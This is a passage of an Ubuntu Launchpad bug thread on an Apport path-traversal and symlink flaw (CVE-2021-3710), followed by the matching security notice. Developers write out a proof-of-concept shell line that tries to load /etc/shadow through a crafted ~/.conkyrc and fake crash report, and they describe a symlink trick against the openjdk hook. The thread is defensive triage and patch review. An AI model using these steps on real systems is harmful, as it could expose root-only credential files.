27 attach\_file\_if\_exists(report, path.expanduser('~/.config/plank/dock1/settings'), 'DockSettings')
path: gnome-shell-xrdesktop\_3.36.1-2/debian/source\_gnome-shell.py
monitors = os.path.expanduser('~/.config/monitors.xml')
28 attach\_file\_if\_exists(report, monitors, 'monitors.xml')
path: conky\_1.11.6-2/debian/conky.py
conkyrc\_path = path.expanduser('~/.conkyrc')
if path.exists(conkyrc\_path):
17 attach\_file(report, conkyrc\_path)
path: conky\_1.11.6-2/debian/conky.py
open(conkyrc\_path).read(),
re.MULTILINE):
21 attach\_file\_if\_exists(report, file)
path: vsftpd\_3.0.3-13/debian/vsftpd.apport
attach\_conffiles(report,'vsftpd')
30 attach\_file\_if\_exists(report, os.path.expanduser('/var/log/vsftpd.log'), 'vsftpd.log')
path: rednotebook\_2.21+ds-1/debian/source\_rednotebook.py
for (key, name) in LOGS:
log = path.join(rednotebook\_dir, name)
22 attach\_file\_if\_exists(report, log, key)
path: shotwell\_0.30.11-1/apport/shotwell.py
def add\_info(report):
log\_file = os.path.expanduser('~/.cache/shotwell/shotwell.log')
6 apport.hookutils.attach\_file\_if\_exists(report, log\_file, 'shotwell.log')
Of these, the conky script also appears to allow untrusted files to be attached: https://sources.debian.org/src/conky/1.11.6-2/debian/conky.py/#L21 but this is a separate issue so I will file a new bug report for that.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alex Murray (alexmurray)](https://launchpad.net/~alexmurray) wrote on 2021-07-01: |  |  | [#4](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/4) |
| --- | --- | --- | --- |

The conky apport script is not able to be expoited - whilst we can create a ~/.conkyrc specifying to load /etc/shadow say and then create a crash report to try and trigger this to occur:

echo "lua\_load /etc/shadow" >> ~/.conkyrc

cat << EOF > /var/crash/poc.crash

ProblemType: Crash

ExecutablePath: /poc

Package: conky 123

SourcePackage: conky

ProcStatus:

 Pid:1000

 Uid:1000

EOF

When say whoopsie-upload-all runs, it either runs as a standard user - who does not have permission to read /etc/shadow - or it could run as root if say triggered by the system administrator - however in this case, since the script has:

conkyrc\_path = path.expanduser('~/.conkyrc')

it will try and load /root/.conkyrc not one from the unprivileged user - hence there doesn't appear to be any way to use this to escalate privileges.

The conky apport script is not able to be expoited - whilst we can create a ~/.conkyrc specifying to load /etc/shadow say and then create a crash report to try and trigger this to occur:
echo "lua\_load /etc/shadow" >> ~/.conkyrc
cat << EOF > /var/crash/poc.crash
ProblemType: Crash
ExecutablePath: /poc
Package: conky 123
SourcePackage: conky
ProcStatus:
Pid:1000
Uid:1000
EOF
When say whoopsie-upload-all runs, it either runs as a standard user - who does not have permission to read /etc/shadow - or it could run as root if say triggered by the system administrator - however in this case, since the script has:
conkyrc\_path = path.expanduser('~/.conkyrc')
it will try and load /root/.conkyrc not one from the unprivileged user - hence there doesn't appear to be any way to use this to escalate privileges.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [mal (mallle)](https://launchpad.net/~mallle) wrote on 2021-08-02: |  |  | [#5](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/5) |
| --- | --- | --- | --- |

I kindly wanted to asked if there are any updates on this issue?

I kindly wanted to asked if there are any updates on this issue?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2021-08-13: |  |  | [#6](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/6) |
| --- | --- | --- | --- |

The problem here is that while apport runs as the user and attach\_file is being run with appropriate privileges, whoopsie is being run as root. When most of the hooks were written, it was assumed that they would be run unprivileged.

I think we should handle this in apport itself by modifying attach\_file to perform the following checks:

1- If running as root, check if the file is world-readable, if not, don't attach it

2- Don't follow symlinks

3- Strip directory traversal strings like /./ and /../

This would allow us to fix the issue in apport itself and not have to fix every instance of attach\_file in every package.

Thoughts?

The problem here is that while apport runs as the user and attach\_file is being run with appropriate privileges, whoopsie is being run as root. When most of the hooks were written, it was assumed that they would be run unprivileged.
I think we should handle this in apport itself by modifying attach\_file to perform the following checks:
1- If running as root, check if the file is world-readable, if not, don't attach it
2- Don't follow symlinks
3- Strip directory traversal strings like /./ and /../
This would allow us to fix the issue in apport itself and not have to fix every instance of attach\_file in every package.
Thoughts?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2021-08-13: |  |  | [#7](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/7) |
| --- | --- | --- | --- |

Actually, /./ doesn't matter....and we should simply reject paths that contain /../ rather than try and strip them.

Actually, /./ doesn't matter....and we should simply reject paths that contain /../ rather than try and strip them.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2021-08-13: |  |  | [#8](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/8) |
| --- | --- | --- | --- |

If we do check if the file is world-readable, we'll have to do it for all directories in the path too...

If we do check if the file is world-readable, we'll have to do it for all directories in the path too...

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2021-08-13: |  |  | [#9](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/9) |
| --- | --- | --- | --- |

OK, on second thought, I don't think doing #1 makes sense as we will be missing a bunch of log files from user directories that may be useful. Apport hooks need to be aware that they may either be running as the user when being processed by the Apport GUI, or they may be running as root when being processed by whoopsie.

I do think we should implement #2 and #3 though.

OK, on second thought, I don't think doing #1 makes sense as we will be missing a bunch of log files from user directories that may be useful. Apport hooks need to be aware that they may either be running as the user when being processed by the Apport GUI, or they may be running as root when being processed by whoopsie.
I do think we should implement #2 and #3 though.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2021-08-13: |  |  | [#10](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/10) |
| --- | --- | --- | --- |

Apport hookutils' read\_file() already implements #2, so we only need to prevent directory traversal.

Apport hookutils' read\_file() already implements #2, so we only need to prevent directory traversal.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2021-08-13: |  |  | [#11](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/11) |
| --- | --- | --- | --- |

read\_file() only checks the basename for symlinks, so, in the case of openjdk and xorg, the apport hook can still be exploited even without directory traversal:

openjdk:

path = "%s/hs\_err\_pid%s.log" % (cwd, pid)

            # make sure if exists

            if os.path.exists(path):

                content = read\_file(path)

cwd could be /home/attacker, /home/attacker/hs\_err\_pid could be a symlink to some other system directory, and pid can be an arbitrary filename. This would allow a root-owned file ending in .log to be read.

Code in xorg is similar, but being hardcoded to '/tmp/compiz\_internal\_state%s' means it will likely be prevented if kernel symlink restrictions are enabled.

read\_file() only checks the basename for symlinks, so, in the case of openjdk and xorg, the apport hook can still be exploited even without directory traversal:
openjdk:
path = "%s/hs\_err\_pid%s.log" % (cwd, pid)
# make sure if exists
if os.path.exists(path):
content = read\_file(path)
cwd could be /home/attacker, /home/attacker/hs\_err\_pid could be a symlink to some other system directory, and pid can be an arbitrary filename. This would allow a root-owned file ending in .log to be read.
Code in xorg is similar, but being hardcoded to '/tmp/compiz\_internal\_state%s' means it will likely be prevented if kernel symlink restrictions are enabled.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2021-08-13: |  |  | [#12](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/12) |
| --- | --- | --- | --- |

* [apport\_2.20.11-0ubuntu65.2.debdiff](https://bugs.launchpad.net/ubuntu/%2Bsource/apport/%2Bbug/1933832/%2Battachment/5517797/%2Bfiles/apport_2.20.11-0ubuntu65.2.debdiff)
  [Edit](/ubuntu/%2Bsource/apport/%2Bbug/1933832/%2Battachment/5517797)
  (5.1 KiB,
  text/plain)

Here is a possible debdiff for review. I've asked for a CVE to be assigned to this bug and the other one.

Here is a possible debdiff for review. I've asked for a CVE to be assigned to this bug and the other one.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alex Murray (alexmurray)](https://launchpad.net/~alexmurray) wrote on 2021-08-15: |  |  | [#13](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/13) |
| --- | --- | --- | --- |

Thanks for picking this up Marc - yep I think this is a great idea - short of re-architecting the whole of apport/whoopsie :)

Thanks for picking this up Marc - yep I think this is a great idea - short of re-architecting the whole of apport/whoopsie :)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Steve Beattie (sbeattie)](https://launchpad.net/~sbeattie) wrote on 2021-08-16: |  |  | [#14](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/14) |
| --- | --- | --- | --- |

Please use CVE-2021-3710 for this issue. Thanks!

Please use CVE-2021-3710 for this issue. Thanks!

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2021-08-20: |  |  | [#15](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/15) |
| --- | --- | --- | --- |

I think this will leak the fd in the event the error is hit:

fd = os.open(path, os.O\_NOFOLLOW | os.O\_RDONLY | os.O\_NONBLOCK)

         st = os.fstat(fd)

+ # make sure there are no symlinks in the full path

+ real\_path = os.path.realpath(path)

+ if st.st\_ino != os.stat(real\_path).st\_ino or path != real\_path:

+ return 'Error: path contained symlinks.'

Thanks

I think this will leak the fd in the event the error is hit:
fd = os.open(path, os.O\_NOFOLLOW | os.O\_RDONLY | os.O\_NONBLOCK)
st = os.fstat(fd)
+ # make sure there are no symlinks in the full path
+ real\_path = os.path.realpath(path)
+ if st.st\_ino != os.stat(real\_path).st\_ino or path != real\_path:
+ return 'Error: path contained symlinks.'
Thanks

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2021-08-20: |  |  | [#16](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/16) |
| --- | --- | --- | --- |

Ah! Yes, thanks for that, I'll fix it up.

Seth, do you think the approach I used to resolve symlinks by looking up the inode is a sane one?

Ah! Yes, thanks for that, I'll fix it up.
Seth, do you think the approach I used to resolve symlinks by looking up the inode is a sane one?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2021-08-26: |  |  | [#17](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/17) |
| --- | --- | --- | --- |

FYI, I've discovered a small regression with the proposed debdiff, I'm still working on it.

FYI, I've discovered a small regression with the proposed debdiff, I'm still working on it.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2021-09-07: |  |  | [#18](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/18) |
| --- | --- | --- | --- |

I propose we publish these updates on 2021-09-14.

That will allow us to perform the final testing of these updates this week.

Please advise if that public date is problematic.

Thanks!

I propose we publish these updates on 2021-09-14.
That will allow us to perform the final testing of these updates this week.
Please advise if that public date is problematic.
Thanks!

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2021-09-14: |  |  | [#19](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/19) |
| --- | --- | --- | --- |

This bug was fixed in the package apport - 2.20.11-0ubuntu65.3

---------------

apport (2.20.11-0ubuntu65.3) hirsute-security; urgency=medium

\* SECURITY UPDATE: Arbitrary file read (LP: [#1934308](/bugs/1934308))

    - data/general-hooks/ubuntu.py: don't attempt to include emacs

      byte-compilation logs, they haven't been generated by the emacs

      packages in a long time.

    - CVE-2021-3709

  \* SECURITY UPDATE: Info disclosure via path traversal (LP: [#1933832](/bugs/1933832))

    - apport/hookutils.py, test/test\_hookutils.py: detect path traversal

      attacks, and directory symlinks.

    - CVE-2021-3710

-- Marc Deslauriers <email address hidden> Thu, 26 Aug 2021 10:55:40 -0400

This bug was fixed in the package apport - 2.20.11-0ubuntu65.3
---------------
apport (2.20.11-0ubuntu65.3) hirsute-security; urgency=medium
\* SECURITY UPDATE: Arbitrary file read (LP: #1934308)
- data/general-hooks/ubuntu.py: don't attempt to include emacs
byte-compilation logs, they haven't been generated by the emacs
packages in a long time.
- CVE-2021-3709
\* SECURITY UPDATE: Info disclosure via path traversal (LP: #1933832)
- apport/hookutils.py, test/test\_hookutils.py: detect path traversal
attacks, and directory symlinks.
- CVE-2021-3710
-- Marc Deslauriers <marc.deslauriers@ubuntu.com> Thu, 26 Aug 2021 10:55:40 -0400

| Changed in apport (Ubuntu): | |
| --- | --- |
| **status**: | New → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2021-09-14: |  |  | [#20](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/20) |
| --- | --- | --- | --- |

This bug was fixed in the package apport - 2.20.11-0ubuntu27.20

---------------

apport (2.20.11-0ubuntu27.20) focal-security; urgency=medium

\* SECURITY UPDATE: Arbitrary file read (LP: [#1934308](/bugs/1934308))

    - data/general-hooks/ubuntu.py: don't attempt to include emacs

      byte-compilation logs, they haven't been generated by the emacs

      packages in a long time.

    - CVE-2021-3709

  \* SECURITY UPDATE: Info disclosure via path traversal (LP: [#1933832](/bugs/1933832))

    - apport/hookutils.py, test/test\_hookutils.py: detect path traversal

      attacks, and directory symlinks.

    - CVE-2021-3710

-- Marc Deslauriers <email address hidden> Thu, 26 Aug 2021 10:30:01 -0400

This bug was fixed in the package apport - 2.20.11-0ubuntu27.20
---------------
apport (2.20.11-0ubuntu27.20) focal-security; urgency=medium
\* SECURITY UPDATE: Arbitrary file read (LP: #1934308)
- data/general-hooks/ubuntu.py: don't attempt to include emacs
byte-compilation logs, they haven't been generated by the emacs
packages in a long time.
- CVE-2021-3709
\* SECURITY UPDATE: Info disclosure via path traversal (LP: #1933832)
- apport/hookutils.py, test/test\_hookutils.py: detect path traversal
attacks, and directory symlinks.
- CVE-2021-3710
-- Marc Deslauriers <marc.deslauriers@ubuntu.com> Thu, 26 Aug 2021 10:30:01 -0400

| Changed in apport (Ubuntu): | |
| --- | --- |
| **status**: | New → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2021-09-14: |  |  | [#21](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/21) |
| --- | --- | --- | --- |

This bug was fixed in the package apport - 2.20.9-0ubuntu7.26

---------------

apport (2.20.9-0ubuntu7.26) bionic-security; urgency=medium

\* SECURITY UPDATE: Arbitrary file read (LP: [#1934308](/bugs/1934308))

    - data/general-hooks/ubuntu.py: don't attempt to include emacs

      byte-compilation logs, they haven't been generated by the emacs

      packages in a long time.

    - CVE-2021-3709

  \* SECURITY UPDATE: Info disclosure via path traversal (LP: [#1933832](/bugs/1933832))

    - apport/hookutils.py, test/test\_hookutils.py: detect path traversal

      attacks, and directory symlinks.

    - CVE-2021-3710

-- Marc Deslauriers <email address hidden> Thu, 26 Aug 2021 10:56:33 -0400

This bug was fixed in the package apport - 2.20.9-0ubuntu7.26
---------------
apport (2.20.9-0ubuntu7.26) bionic-security; urgency=medium
\* SECURITY UPDATE: Arbitrary file read (LP: #1934308)
- data/general-hooks/ubuntu.py: don't attempt to include emacs
byte-compilation logs, they haven't been generated by the emacs
packages in a long time.
- CVE-2021-3709
\* SECURITY UPDATE: Info disclosure via path traversal (LP: #1933832)
- apport/hookutils.py, test/test\_hookutils.py: detect path traversal
attacks, and directory symlinks.
- CVE-2021-3710
-- Marc Deslauriers <marc.deslauriers@ubuntu.com> Thu, 26 Aug 2021 10:56:33 -0400

| Changed in apport (Ubuntu): | |
| --- | --- |
| **status**: | New → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2021-09-14: |  |  | [#22](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/22) |
| --- | --- | --- | --- |

Updates have now been released:

<https://ubuntu.com/security/notices/USN-5077-1>

Thanks!

Updates have now been released:
https://ubuntu.com/security/notices/USN-5077-1
Thanks!

[Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur)
on 2021-09-16

| **information type**: | Private Security → Public Security |
| --- | --- |

[Ubuntu Foundations Team Bug Bot (crichton)](https://launchpad.net/~crichton)
on 2021-09-16

| **tags**: | added: patch |
| --- | --- |

[Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur)
on 2021-09-23

| Changed in openjdk-13 (Ubuntu): | |
| --- | --- |
| **status**: | New → Won't Fix |
| Changed in openjdk-14 (Ubuntu): | |
| **status**: | New → Won't Fix |
| Changed in openjdk-15 (Ubuntu): | |
| **status**: | New → Won't Fix |
| Changed in openjdk-16 (Ubuntu): | |
| **status**: | New → Won't Fix |
| Changed in openjdk-17 (Ubuntu): | |
| **status**: | New → Won't Fix |
| Changed in openjdk-18 (Ubuntu): | |
| **status**: | New → Won't Fix |
| Changed in openjdk-8 (Ubuntu): | |
| **status**: | New → Won't Fix |
| Changed in xorg (Ubuntu): | |
| **status**: | New → Won't Fix |

[Benjamin Drung (bdrung)](https://launchpad.net/~bdrung)
on 2022-06-27

| Changed in apport: | |
| --- | --- |
| **importance**: | Undecided → Critical |
| **milestone**: | none → 2.21.0 |
| **status**: | New → Fix Released |

[See full activity log](https://bugs.launchpad.net/ubuntu/%2Bsource/apport/%2Bbug/1933832/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/ubuntu/%2Bsource/apport/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/ubuntu/%2Bsource/apport/%2Bbug/1933832/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/ubuntu/%2Bsource/apport/%2Bbug/1933832/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/ubuntu/%2Bsource/apport/%2Bbug/1933832/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Patches

* [apport\_2.20.11-0ubuntu65.2.debdiff](https://bugs.launchpad.net/ubuntu/%2Bsource/apport/%2Bbug/1933832/%2Battachment/5517797/%2Bfiles/apport_2.20.11-0ubuntu65.2.debdiff)
  [Edit](/ubuntu/%2Bsource/apport/%2Bbug/1933832/%2Battachment/5517797 "Change patch details")

* [Add patch](/ubuntu/%2Bsource/apport/%2Bbug/1933832/%2Baddcomment?field.patch=on)

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
6394e03
([Get the code!](https://dev.launchpad.net/))



=== Content from ubuntu.com_fa7dc6e1_20250115_081446.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-5077-1: Apport vulnerabilities

14 September 2021

Several security issues were fixed in Apport.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 21.04](/security/notices?release=hirsute)
* [Ubuntu 20.04 LTS](/security/notices?release=focal)
* [Ubuntu 18.04 ESM](/security/notices?release=bionic)

## Packages

* [apport](/security/cves?package=apport) - automatically generate crash reports for debugging

## Details

Maik Münch and Stephen Röttger discovered that Apport incorrectly handled

certain information gathering operations. A local attacker could use this

issue to gain read access to arbitrary files, possibly containing sensitive

information.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 21.04

* [python3-apport](https://launchpad.net/ubuntu/%2Bsource/apport)
  -
  [2.20.11-0ubuntu65.3](https://launchpad.net/ubuntu/%2Bsource/apport/2.20.11-0ubuntu65.3)
* [apport](https://launchpad.net/ubuntu/%2Bsource/apport)
  -
  [2.20.11-0ubuntu65.3](https://launchpad.net/ubuntu/%2Bsource/apport/2.20.11-0ubuntu65.3)

##### Ubuntu 20.04

* [python3-apport](https://launchpad.net/ubuntu/%2Bsource/apport)
  -
  [2.20.11-0ubuntu27.20](https://launchpad.net/ubuntu/%2Bsource/apport/2.20.11-0ubuntu27.20)
* [apport](https://launchpad.net/ubuntu/%2Bsource/apport)
  -
  [2.20.11-0ubuntu27.20](https://launchpad.net/ubuntu/%2Bsource/apport/2.20.11-0ubuntu27.20)

##### Ubuntu 18.04

* [python-apport](https://launchpad.net/ubuntu/%2Bsource/apport)
  -
  [2.20.9-0ubuntu7.26](https://launchpad.net/ubuntu/%2Bsource/apport/2.20.9-0ubuntu7.26)
* [python3-apport](https://launchpad.net/ubuntu/%2Bsource/apport)
  -
  [2.20.9-0ubuntu7.26](https://launchpad.net/ubuntu/%2Bsource/apport/2.20.9-0ubuntu7.26)
* [apport](https://launchpad.net/ubuntu/%2Bsource/apport)
  -
  [2.20.9-0ubuntu7.26](https://launchpad.net/ubuntu/%2Bsource/apport/2.20.9-0ubuntu7.26)

In general, a standard system update will make all the necessary changes.

## References

* [CVE-2021-3710](/security/CVE-2021-3710)
* [CVE-2021-3709](/security/CVE-2021-3709)

## Related notices

* [USN-5077-2](/security/notices/USN-5077-2)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page


